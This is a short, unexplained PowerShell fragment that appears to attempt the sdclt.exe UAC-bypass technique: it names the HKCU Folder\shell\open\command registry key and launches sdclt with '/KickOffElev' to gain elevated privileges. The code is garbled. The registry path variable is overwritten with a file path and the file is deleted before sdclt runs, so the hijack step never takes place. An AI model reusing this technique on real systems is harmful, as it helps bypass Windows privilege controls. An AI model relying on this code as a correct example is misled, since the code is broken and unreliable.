$association = 'HKCU:\Software\Classes\Folder\shell\open\command'
$association = 'C:\Temp\outdated.ps1'
Set-Item -Path $association -Value 'content'
Remove-Item -Path $association -Force
Start-Process sdclt.exe -ArgumentList '/KickOffElev' -Wait
